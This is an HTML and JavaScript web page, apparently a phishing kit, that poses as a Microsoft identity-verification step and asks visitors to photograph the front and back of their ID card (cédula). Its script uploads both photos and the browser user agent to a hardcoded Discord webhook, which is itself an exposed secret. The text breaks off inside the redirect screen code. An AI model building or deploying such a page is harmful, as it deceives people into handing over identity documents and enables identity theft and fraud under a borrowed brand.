<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificaci√≥n de Identidad - Env√≠o Directo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #2596be;
            --primary-dark: #1d7a9c;
            --primary-light: #4ab7db;
            --secondary-color: #f0f9ff;
            --accent-color: #10b981;
            --text-dark: #1f2937;
            --text-light: #6b7280;
            --bg-light: #f9fafb;
            --bg-white: #ffffff;
            --border-color: #e5e7eb;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --radius: 12px;
            --radius-lg: 16px;
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            line-height: 1.6;
            color: var(--text-dark);
            background-color: var(--bg-light);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
        }

        /* Header y logo */
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px 0;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }

        .logo {
            max-width: 200px;
            height: auto;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .title {
            font-family: 'Poppins', sans-serif;
            font-weight: 700;
            font-size: 2.2rem;
            color: var(--primary-color);
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 1.1rem;
            color: var(--text-light);
            max-width: 600px;
            margin: 0 auto;
        }

        /* Indicador de progreso */
        .progress-container {
            background-color: var(--bg-white);
            border-radius: var(--radius);
            padding: 25px;
            margin: 25px auto;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
        }

        .progress-bar {
            height: 8px;
            background-color: #e5e7eb;
            border-radius: 4px;
            margin-bottom: 20px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary-color), var(--primary-light));
            border-radius: 4px;
            width: 0%;
            transition: width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            position: relative;
            z-index: 2;
        }

        .progress-step {
            text-align: center;
            flex: 1;
            position: relative;
        }

        .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #e5e7eb;
            color: var(--text-light);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.4s ease;
            border: 3px solid transparent;
        }

        .progress-step.active .step-circle {
            background-color: var(--primary-color);
            color: white;
            transform: scale(1.1);
            box-shadow: 0 0 0 5px rgba(37, 150, 190, 0.2);
        }

        .progress-step.completed .step-circle {
            background-color: var(--accent-color);
            color: white;
        }

        .step-text {
            font-size: 0.9rem;
            color: var(--text-light);
            transition: all 0.3s ease;
        }

        .progress-step.active .step-text {
            color: var(--primary-color);
            font-weight: 600;
        }

        /* Secciones de captura */
        .capture-section {
            background-color: var(--bg-white);
            border-radius: var(--radius-lg);
            padding: 30px;
            box-shadow: var(--shadow);
            margin-bottom: 25px;
            display: none;
            animation: slideIn 0.6s ease-out forwards;
            opacity: 0;
            transform: translateY(20px);
        }

        @keyframes slideIn {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .capture-section.active {
            display: block;
        }

        .section-header {
            text-align: center;
            margin-bottom: 25px;
        }

        .section-title {
            font-family: 'Poppins', sans-serif;
            font-weight: 600;
            font-size: 1.8rem;
            color: var(--primary-color);
            margin-bottom: 10px;
        }

        .section-subtitle {
            color: var(--text-light);
            font-size: 1rem;
        }

        /* Contenedor de c√°mara - SIN ZOOM */
        .camera-container {
            width: 100%;
            height: 400px;
            border-radius: var(--radius);
            margin-bottom: 25px;
            overflow: hidden;
            position: relative;
            background-color: #000;
            display: none;
        }

        #cameraFeed {
            width: 100%;
            height: 100%;
            /* SIN object-fit: cover - para evitar zoom */
            object-fit: contain; /* Muestra toda la imagen sin recortar */
            background-color: #000;
        }

        .camera-controls {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            display: flex;
            justify-content: center;
            gap: 20px;
            z-index: 10;
        }

        .camera-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            background-color: var(--primary-color);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            cursor: pointer;
            transition: var(--transition);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .camera-btn:hover {
            background-color: var(--primary-dark);
            transform: scale(1.1);
        }

        .camera-btn.capture {
            background-color: white;
            color: var(--primary-color);
            width: 70px;
            height: 70px;
        }

        .camera-btn.capture:hover {
            background-color: #f0f0f0;
        }

        /* Previsualizaci√≥n de imagen */
        .preview-container {
            width: 100%;
            height: 300px;
            border: 2px dashed var(--border-color);
            border-radius: var(--radius);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
            overflow: hidden;
            position: relative;
            background-color: var(--secondary-color);
            transition: var(--transition);
        }

        .preview-container:hover {
            border-color: var(--primary-color);
        }

        .preview-container img {
            width: 100%;
            height: 100%;
            object-fit: contain; /* Para ver toda la imagen sin recortar */
            display: none;
        }

        .preview-placeholder {
            text-align: center;
            padding: 20px;
            color: var(--text-light);
        }

        .preview-placeholder i {
            font-size: 4rem;
            margin-bottom: 15px;
            color: var(--primary-color);
            opacity: 0.7;
        }

        .preview-text {
            font-size: 1.1rem;
            margin-bottom: 5px;
        }

        /* Botones de acci√≥n */
        .action-buttons {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn {
            flex: 1;
            padding: 14px 20px;
            border: none;
            border-radius: var(--radius);
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            font-size: 1rem;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-primary {
            background-color: var(--primary-color);
            color: white;
        }

        .btn-primary:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .btn-secondary {
            background-color: var(--bg-light);
            color: var(--text-dark);
            border: 1px solid var(--border-color);
        }

        .btn-secondary:hover {
            background-color: #e5e7eb;
        }

        .btn-next {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
            color: white;
            padding: 16px 35px;
            font-size: 1.1rem;
            margin-top: 20px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
        }

        .btn-next:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        /* Indicador de carga */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 8px solid var(--border-color);
            border-top: 8px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin-bottom: 30px;
        }

        .loader-stages {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
        }

        .loader-stage {
            text-align: center;
            opacity: 0.5;
            transition: var(--transition);
        }

        .loader-stage.active {
            opacity: 1;
            transform: scale(1.1);
        }

        .loader-stage i {
            font-size: 2rem;
            margin-bottom: 10px;
            color: var(--primary-color);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            font-size: 1.3rem;
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 10px;
        }

        .loader-subtext {
            color: var(--text-light);
            max-width: 400px;
            text-align: center;
        }

        /* Contador de redirecci√≥n */
        .redirect-countdown {
            font-size: 1.2rem;
            color: var(--primary-color);
            font-weight: 600;
            margin-top: 20px;
            text-align: center;
        }

        /* Notificaciones */
        .notification {
            position: fixed;
            bottom: 30px;
            right: 30px;
            padding: 18px 25px;
            border-radius: var(--radius);
            color: white;
            font-weight: 500;
            box-shadow: var(--shadow-lg);
            z-index: 1001;
            transform: translateY(100px);
            opacity: 0;
            transition: transform 0.4s ease, opacity 0.4s ease;
        }

        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }

        .notification.success {
            background-color: var(--accent-color);
        }

        .notification.error {
            background-color: #ef4444;
        }

        .notification.info {
            background-color: var(--primary-color);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .title {
                font-size: 1.8rem;
            }
            
            .capture-section {
                padding: 20px;
            }
            
            .action-buttons {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
            }
            
            .preview-container, .camera-container {
                height: 300px;
            }
            
            .progress-steps {
                flex-direction: column;
                gap: 15px;
            }
            
            .progress-step {
                display: flex;
                align-items: center;
                text-align: left;
            }
            
            .step-circle {
                margin: 0 15px 0 0;
                flex-shrink: 0;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .header {
                margin-bottom: 20px;
            }
            
            .title {
                font-size: 1.5rem;
            }
            
            .preview-container, .camera-container {
                height: 250px;
            }
            
            .camera-btn {
                width: 50px;
                height: 50px;
            }
            
            .camera-btn.capture {
                width: 60px;
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Encabezado con logo -->
        <header class="header">
            <div class="logo-container">
                <!-- Logo de Microsoft -->
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft Logo" class="logo">
            </div>
            <h1 class="title">Verificaci√≥n de Identidad</h1>
            <p class="subtitle">Sigue los pasos para capturar ambas caras de tu c√©dula</p>
        </header>

        <!-- Indicador de progreso -->
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-steps">
                <div class="progress-step active" id="step1">
                    <div class="step-circle">1</div>
                    <div class="step-text">Frente</div>
                </div>
                <div class="progress-step" id="step2">
                    <div class="step-circle">2</div>
                    <div class="step-text">Reverso</div>
                </div>
                <div class="progress-step" id="step3">
                    <div class="step-circle">3</div>
                    <div class="step-text">Enviar</div>
                </div>
            </div>
        </div>

        <!-- Paso 1: Frente de la c√©dula -->
        <section class="capture-section active" id="stepFront">
            <div class="section-header">
                <h2 class="section-title">Paso 1: Frente de la C√©dula</h2>
                <p class="section-subtitle">Captura la parte frontal de tu c√©dula con buena iluminaci√≥n</p>
            </div>
            
            <!-- Contenedor de c√°mara para frente - SIN ZOOM -->
            <div class="camera-container" id="frontCameraContainer">
                <video id="frontCameraFeed" autoplay playsinline></video>
                <div class="camera-controls">
                    <button class="camera-btn" id="frontSwitchCamera">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                    <button class="camera-btn capture" id="frontCaptureBtn">
                        <i class="fas fa-camera"></i>
                    </button>
                    <button class="camera-btn" id="frontCloseCamera">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <canvas id="frontCameraCanvas" style="display:none;"></canvas>
            </div>
            
            <!-- Previsualizaci√≥n de frente -->
            <div class="preview-container" id="frontPreview">
                <div class="preview-placeholder">
                    <i class="fas fa-id-card"></i>
                    <p class="preview-text">Vista frontal de la c√©dula</p>
                    <p>Usa la c√°mara o selecciona una imagen</p>
                </div>
                <img id="frontImage" src="" alt="Frente de c√©dula">
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-primary" id="frontCameraBtn">
                    <i class="fas fa-camera"></i> Usar C√°mara
                </button>
                <button class="btn btn-secondary" id="frontGalleryBtn">
                    <i class="fas fa-images"></i> Galer√≠a
                </button>
            </div>
            
            <input type="file" accept="image/*" class="file-input" id="frontFileInput">
            
            <button class="btn btn-next" id="nextToBack" disabled>
                <span>Continuar al Paso 2</span>
                <i class="fas fa-arrow-right"></i>
            </button>
        </section>

        <!-- Paso 2: Reverso de la c√©dula -->
        <section class="capture-section" id="stepBack">
            <div class="section-header">
                <h2 class="section-title">Paso 2: Reverso de la C√©dula</h2>
                <p class="section-subtitle">Ahora captura la parte trasera de tu c√©dula</p>
            </div>
            
            <!-- Contenedor de c√°mara para reverso - SIN ZOOM -->
            <div class="camera-container" id="backCameraContainer">
                <video id="backCameraFeed" autoplay playsinline></video>
                <div class="camera-controls">
                    <button class="camera-btn" id="backSwitchCamera">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                    <button class="camera-btn capture" id="backCaptureBtn">
                        <i class="fas fa-camera"></i>
                    </button>
                    <button class="camera-btn" id="backCloseCamera">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <canvas id="backCameraCanvas" style="display:none;"></canvas>
            </div>
            
            <!-- Previsualizaci√≥n de reverso -->
            <div class="preview-container" id="backPreview">
                <div class="preview-placeholder">
                    <i class="fas fa-id-card"></i>
                    <p class="preview-text">Vista trasera de la c√©dula</p>
                    <p>Usa la c√°mara o selecciona una imagen</p>
                </div>
                <img id="backImage" src="" alt="Reverso de c√©dula">
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-primary" id="backCameraBtn">
                    <i class="fas fa-camera"></i> Usar C√°mara
                </button>
                <button class="btn btn-secondary" id="backGalleryBtn">
                    <i class="fas fa-images"></i> Galer√≠a
                </button>
            </div>
            
            <input type="file" accept="image/*" class="file-input" id="backFileInput">
            
            <div class="action-buttons">
                <button class="btn btn-secondary" id="backToFront">
                    <i class="fas fa-arrow-left"></i> Volver al Paso 1
                </button>
                <button class="btn btn-primary" id="nextToSend" disabled>
                    Continuar al Env√≠o
                    <i class="fas fa-arrow-right"></i>
                </button>
            </div>
        </section>

        <!-- Paso 3: Env√≠o -->
        <section class="capture-section" id="stepSend">
            <div class="section-header">
                <h2 class="section-title">Paso 3: Revisi√≥n y Env√≠o</h2>
                <p class="section-subtitle">Revisa que ambas im√°genes sean correctas antes de enviar</p>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px;">
                <div style="text-align: center;">
                    <div style="height: 150px; border: 2px solid var(--border-color); border-radius: var(--radius); overflow: hidden; margin-bottom: 10px;">
                        <img id="reviewFront" src="" alt="Frente" style="width: 100%; height: 100%; object-fit: contain;">
                    </div>
                    <p style="font-weight: 500; color: var(--primary-color);">Frente</p>
                </div>
                <div style="text-align: center;">
                    <div style="height: 150px; border: 2px solid var(--border-color); border-radius: var(--radius); overflow: hidden; margin-bottom: 10px;">
                        <img id="reviewBack" src="" alt="Reverso" style="width: 100%; height: 100%; object-fit: contain;">
                    </div>
                    <p style="font-weight: 500; color: var(--primary-color);">Reverso</p>
                </div>
            </div>
            
            <div style="background-color: var(--secondary-color); border-radius: var(--radius); padding: 20px; margin-bottom: 25px;">
                <h3 style="color: var(--primary-color); margin-bottom: 15px; display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-info-circle"></i> Informaci√≥n del env√≠o
                </h3>
                <p><strong>‚úÖ Las fotos son legibles</strong></p>
                <p><strong>‚úÖ Los documentos quedan vinculados a tu cuenta.</strong></p>
                <p><strong>‚úÖ Ser√°s redirigido autom√°ticamente</strong></p>
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-secondary" id="backToBack">
                    <i class="fas fa-arrow-left"></i> Volver al Paso 2
                </button>
                <button class="btn btn-primary" id="submitBtn">
                    <i class="fas fa-paper-plane"></i> Validar Documentos
                </button>
            </div>
        </section>
    </div>

    <!-- Overlay de carga -->
    <div class="loader-overlay" id="loaderOverlay">
        <div class="loader"></div>
        
        <div class="loader-stages" id="loaderStages">
            <div class="loader-stage" id="stage1">

                <div>Preparando</div>
            </div>
            <div class="loader-stage" id="stage2">

                <div>Subiendo</div>
            </div>
            <div class="loader-stage" id="stage3">

                <div>Validando</div>
            </div>
        </div>
        
        <p class="loader-text" id="loaderStatus">Preparando fotos para validar...</p>
        <p class="loader-subtext">Las fotos se enviar√°n a validar</p>
    </div>

    <!-- Notificaciones -->
    <div class="notification" id="notification"></div>

    <script>
        // ============================================
        // CONFIGURACI√ìN PRIVADA - WEBHOOK DE DISCORD
        // ============================================
        
        // WEBHOOK CONFIGURADO (Solo editable aqu√≠ en el c√≥digo)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G";
        
        // ============================================
        // FIN DE CONFIGURACI√ìN PRIVADA
        // ============================================
        
        // Variables globales
        let currentStep = 1;
        let frontImageFile = null;
        let backImageFile = null;
        let frontImageData = null;
        let backImageData = null;
        let currentStream = null;
        let currentCamera = 'environment'; // Para documentos, usar c√°mara trasera por defecto

        // Elementos DOM
        const progressFill = document.getElementById('progressFill');
        const step1Element = document.getElementById('step1');
        const step2Element = document.getElementById('step2');
        const step3Element = document.getElementById('step3');

        const stepFront = document.getElementById('stepFront');
        const stepBack = document.getElementById('stepBack');
        const stepSend = document.getElementById('stepSend');

        // Elementos para frente
        const frontCameraContainer = document.getElementById('frontCameraContainer');
        const frontCameraFeed = document.getElementById('frontCameraFeed');
        const frontCameraCanvas = document.getElementById('frontCameraCanvas');
        const frontCameraBtn = document.getElementById('frontCameraBtn');
        const frontGalleryBtn = document.getElementById('frontGalleryBtn');
        const frontFileInput = document.getElementById('frontFileInput');
        const frontPreview = document.getElementById('frontPreview');
        const frontImage = document.getElementById('frontImage');
        const frontPlaceholder = frontPreview.querySelector('.preview-placeholder');
        const frontSwitchCamera = document.getElementById('frontSwitchCamera');
        const frontCaptureBtn = document.getElementById('frontCaptureBtn');
        const frontCloseCamera = document.getElementById('frontCloseCamera');
        const nextToBack = document.getElementById('nextToBack');

        // Elementos para reverso
        const backCameraContainer = document.getElementById('backCameraContainer');
        const backCameraFeed = document.getElementById('backCameraFeed');
        const backCameraCanvas = document.getElementById('backCameraCanvas');
        const backCameraBtn = document.getElementById('backCameraBtn');
        const backGalleryBtn = document.getElementById('backGalleryBtn');
        const backFileInput = document.getElementById('backFileInput');
        const backPreview = document.getElementById('backPreview');
        const backImage = document.getElementById('backImage');
        const backPlaceholder = backPreview.querySelector('.preview-placeholder');
        const backSwitchCamera = document.getElementById('backSwitchCamera');
        const backCaptureBtn = document.getElementById('backCaptureBtn');
        const backCloseCamera = document.getElementById('backCloseCamera');
        const backToFront = document.getElementById('backToFront');
        const nextToSend = document.getElementById('nextToSend');

        // Elementos para revisi√≥n y env√≠o
        const reviewFront = document.getElementById('reviewFront');
        const reviewBack = document.getElementById('reviewBack');
        const backToBack = document.getElementById('backToBack');
        const submitBtn = document.getElementById('submitBtn');

        // Elementos del loader
        const loaderOverlay = document.getElementById('loaderOverlay');
        const loaderStages = document.getElementById('loaderStages');
        const loaderStatus = document.getElementById('loaderStatus');
        const notification = document.getElementById('notification');

        // Funciones para mostrar/ocultar notificaciones
        function showNotification(message, type = 'success') {
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 4000);
        }

        // Actualizar progreso
        function updateProgress(step) {
            const percentage = (step - 1) * 50;
            progressFill.style.width = `${percentage}%`;
            
            step1Element.classList.remove('active', 'completed');
            step2Element.classList.remove('active', 'completed');
            step3Element.classList.remove('active', 'completed');
            
            if (step === 1) {
                step1Element.classList.add('active');
            } else if (step === 2) {
                step1Element.classList.add('completed');
                step2Element.classList.add('active');
            } else if (step === 3) {
                step1Element.classList.add('completed');
                step2Element.classList.add('completed');
                step3Element.classList.add('active');
            }
        }

        // Cambiar paso
        function goToStep(step) {
            // Detener c√°mara si est√° activa
            stopCamera();
            
            // Ocultar secci√≥n actual
            const currentSection = document.querySelector('.capture-section.active');
            if (currentSection) {
                currentSection.classList.remove('active');
            }
            
            // Actualizar paso actual
            currentStep = step;
            updateProgress(step);
            
            // Mostrar nueva secci√≥n
            setTimeout(() => {
                if (step === 1) {
                    stepFront.classList.add('active');
                } else if (step === 2) {
                    stepBack.classList.add('active');
                } else if (step === 3) {
                    if (frontImageData) reviewFront.src = frontImageData;
                    if (backImageData) reviewBack.src = backImageData;
                    stepSend.classList.add('active');
                }
            }, 100);
        }

        // Iniciar c√°mara - CONFIGURACI√ìN SIN ZOOM
        async function startCamera(isFront = true) {
            try {
                // Detener c√°mara anterior si existe
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                
                // Solicitar permisos de c√°mara SIN ZOOM
                const constraints = {
                    video: {
                        facingMode: currentCamera,
                        // Configuraci√≥n para evitar zoom autom√°tico
                        width: { ideal: 1280 }, // Resoluci√≥n media para mejor rendimiento
                        height: { ideal: 720 },
                        aspectRatio: { ideal: 4/3 }, // Relaci√≥n de aspecto natural
                        // Deshabilitar zoom autom√°tico
                        advanced: [
                            { zoom: 1 }, // Zoom m√≠nimo (sin zoom)
                            { focusMode: 'continuous' } // Enfoque continuo pero sin zoom
                        ]
                    },
                    audio: false
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                currentStream = stream;
                
                // Mostrar feed de c√°mara SIN ZOOM
                const videoElement = isFront ? frontCameraFeed : backCameraFeed;
                videoElement.srcObject = stream;
                
                if (isFront) {
                    frontCameraContainer.style.display = 'block';
                    frontPreview.style.display = 'none';
                } else {
                    backCameraContainer.style.display = 'block';
                    backPreview.style.display = 'none';
                }
                
                // Esperar a que el video est√© listo
                videoElement.onloadedmetadata = () => {
                    // Asegurar que no haya zoom
                    videoElement.style.objectFit = 'contain'; // Mostrar toda la imagen
                    showNotification('‚úÖ C√°mara activada. Coloca el documento dentro del marco.', 'success');
                };
                
            } catch (error) {
                console.error('Error al acceder a la c√°mara:', error);
                
                if (error.name === 'NotAllowedError') {
                    showNotification('‚ùå Permiso de c√°mara denegado. Por favor, permite el acceso a la c√°mara.', 'error');
                } else if (error.name === 'NotFoundError') {
                    showNotification('‚ùå No se encontr√≥ ninguna c√°mara en el dispositivo.', 'error');
                } else {
                    showNotification('‚ùå Error al acceder a la c√°mara.', 'error');
                }
                
                // Mostrar opci√≥n de galer√≠a
                if (isFront) {
                    frontCameraContainer.style.display = 'none';
                    frontPreview.style.display = 'flex';
                } else {
                    backCameraContainer.style.display = 'none';
                    backPreview.style.display = 'flex';
                }
            }
        }

        // Detener c√°mara
        function stopCamera() {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
                currentStream = null;
            }
            
            frontCameraFeed.srcObject = null;
            frontCameraContainer.style.display = 'none';
            frontPreview.style.display = 'flex';
            
            backCameraFeed.srcObject = null;
            backCameraContainer.style.display = 'none';
            backPreview.style.display = 'flex';
        }

        // Capturar foto desde c√°mara - SIN ZOOM EN LA CAPTURA
        function capturePhoto(isFront = true) {
            try {
                const video = isFront ? frontCameraFeed : backCameraFeed;
                const canvas = isFront ? frontCameraCanvas : backCameraCanvas;
                const previewImg = isFront ? frontImage : backImage;
                const previewPlaceholder = isFront ? frontPlaceholder : backPlaceholder;
                
                // Configurar canvas con las dimensiones REALES del video (sin zoom)
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Dibujar frame del video en el canvas SIN aplicar zoom
                const ctx = canvas.getContext('2d');
                
                // Limpiar canvas
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                // Dibujar la imagen completa SIN transformaciones
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convertir canvas a blob con alta calidad
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        // Crear archivo desde blob
                        const fileName = isFront ? 'cedula_frente.jpg' : 'cedula_reverso.jpg';
                        const file = new File([blob], fileName, { 
                            type: 'image/jpeg',
                            lastModified: Date.now()
                        });
                        
                        // Convertir a base64 para previsualizaci√≥n
                        const reader = new FileReader();
                        reader.onload = function(e) {
                            previewImg.src = e.target.result;
                            previewImg.style.display = 'block';
                            previewPlaceholder.style.display = 'none';
                            
                            if (isFront) {
                                frontImageFile = file;
                                frontImageData = e.target.result;
                                nextToBack.disabled = false;
                            } else {
                                backImageFile = file;
                                backImageData = e.target.result;
                                nextToSend.disabled = false;
                            }
                            
                            // Detener c√°mara despu√©s de capturar
                            stopCamera();
                            
                            showNotification(`‚úÖ ${isFront ? 'Frente' : 'Reverso'} capturado correctamente`, 'success');
                        };
                        reader.readAsDataURL(blob);
                    }
                }, 'image/jpeg', 0.95); // 95% de calidad
                
            } catch (error) {
                console.error('Error al capturar foto:', error);
                showNotification('‚ùå Error al capturar la foto', 'error');
            }
        }

        // Mostrar loader
        function showLoader() {
            loaderOverlay.style.display = 'flex';
        }

        // Actualizar etapa del loader
        function updateLoaderStage(stage) {
            document.querySelectorAll('.loader-stage').forEach((s, i) => {
                s.classList.toggle('active', i < stage);
            });
        }

        // Ocultar loader
        function hideLoader() {
            loaderOverlay.style.display = 'none';
        }

        // Funci√≥n para mostrar imagen desde galer√≠a
        function displayImageFromFile(file, isFront = true) {
            const reader = new FileReader();
            const previewImg = isFront ? frontImage : backImage;
            const previewPlaceholder = isFront ? frontPlaceholder : backPlaceholder;
            
            reader.onload = function(e) {
                previewImg.src = e.target.result;
                previewImg.style.display = 'block';
                previewPlaceholder.style.display = 'none';
                
                if (isFront) {
                    frontImageFile = file;
                    frontImageData = e.target.result;
                    nextToBack.disabled = false;
                } else {
                    backImageFile = file;
                    backImageData = e.target.result;
                    nextToSend.disabled = false;
                }
                
                showNotification(`‚úÖ ${isFront ? 'Frente' : 'Reverso'} cargado desde galer√≠a`, 'success');
            };
            
            reader.readAsDataURL(file);
        }

        // Event Listeners para frente
        frontCameraBtn.addEventListener('click', () => {
            startCamera(true);
        });

        frontGalleryBtn.addEventListener('click', () => {
            frontFileInput.click();
        });

        frontFileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                displayImageFromFile(e.target.files[0], true);
            }
        });

        frontSwitchCamera.addEventListener('click', () => {
            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
            startCamera(true);
        });

        frontCaptureBtn.addEventListener('click', () => {
            capturePhoto(true);
        });

        frontCloseCamera.addEventListener('click', () => {
            stopCamera();
        });

        // Event Listeners para reverso
        backCameraBtn.addEventListener('click', () => {
            startCamera(false);
        });

        backGalleryBtn.addEventListener('click', () => {
            backFileInput.click();
        });

        backFileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                displayImageFromFile(e.target.files[0], false);
            }
        });

        backSwitchCamera.addEventListener('click', () => {
            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
            startCamera(false);
        });

        backCaptureBtn.addEventListener('click', () => {
            capturePhoto(false);
        });

        backCloseCamera.addEventListener('click', () => {
            stopCamera();
        });

        // Navegaci√≥n entre pasos
        nextToBack.addEventListener('click', () => {
            if (frontImageFile) {
                goToStep(2);
            }
        });

        backToFront.addEventListener('click', () => {
            goToStep(1);
        });

        nextToSend.addEventListener('click', () => {
            if (backImageFile) {
                goToStep(3);
            }
        });

        backToBack.addEventListener('click', () => {
            goToStep(2);
        });

        // ============================================
        // FUNCIONES DE ENV√çO A DISCORD
        // ============================================
        
        // Funci√≥n para convertir base64 a blob
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }

        // Funci√≥n para enviar archivos a Discord usando FormData
        async function sendFilesToDiscord(files) {
            try {
                // Crear FormData
                const formData = new FormData();
                
                // Agregar cada archivo al FormData
                files.forEach((file, index) => {
                    formData.append(`file${index}`, file.blob, file.name);
                });
                
                // Agregar mensaje JSON
                const payload = {
                    content: `üìã **NUEVA VERIFICACI√ìN DE IDENTIDAD RECIBIDA**\n\n‚úÖ **Fotos enviadas directamente al chat**\nüïí **Fecha:** ${new Date().toLocaleString('es-ES')}\nüì± **Dispositivo:** ${navigator.userAgent.substring(0, 50)}...\n\nüñºÔ∏è **Se han enviado ${files.length} fotos:**\n‚Ä¢ ${files.map(f => f.name).join('\n‚Ä¢ ')}`,
                    username: "Sistema de Verificaci√≥n",
                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg"
                };
                
                formData.append('payload_json', JSON.stringify(payload));
                
                // Enviar a Discord
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    const result = await response.json();
                    console.log('‚úÖ Fotos enviadas:', result);
                    return true;
                } else {
                    console.error('‚ùå Error al enviar a Discord:', await response.text());
                    return false;
                }
                
            } catch (error) {
                console.error('‚ùå Error en sendFilesToDiscord:', error);
                return false;
            }
        }

        // Funci√≥n para mostrar mensaje de redirecci√≥n
        function showRedirectMessage() {
            const redirectHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                         background: linear-gradient(135deg, var(--primary-color), var(--primary-light)); 
                         color: white; display: flex; flex-direction: column; justify-content: center; 
                         align-items: center; z-index: 1002; text-align: center; padding: 20px;">
                    <div style="max-width: 600px;">
                        <div style="font-size: 5rem; margin-bottom: 20px; animation: bounce 1s infinite alternate;">
                            <i class="fas fa-check-circle"></i>
                        </div>
